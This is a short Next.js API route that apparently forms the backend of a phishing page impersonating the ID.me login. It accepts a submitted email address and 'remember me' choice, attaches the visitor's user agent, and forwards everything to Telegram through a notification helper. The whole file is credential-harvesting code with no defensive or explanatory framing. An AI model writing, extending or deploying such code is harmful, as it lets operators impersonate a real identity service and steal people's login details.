import { NextResponse } from "next/server";
import sendTelegramNotification from "@/app/lib/sendTelegramNotification";

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { email, remember } = body;

    if (!email) {
      return NextResponse.json(
        { success: false, error: "Email is required" },
        { status: 400 }
      );
    }

    const text = `
🧪 ID.me Login

📧 Email: ${email}
💾 Remember me: ${remember ? "Yes" : "No"}
🖥 User Agent: ${req.headers.get("user-agent") ?? "Unknown"}
    `;

    await sendTelegramNotification(text);

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("ID login Telegram failed:", error);
    return NextResponse.json(
      { success: false, error: "Telegram send failed" },
      { status: 500 }
    );
  }
}
